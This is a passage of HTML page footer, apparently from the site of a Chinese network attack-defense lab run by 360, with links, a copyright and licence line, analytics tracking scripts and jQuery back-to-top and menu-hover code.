        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
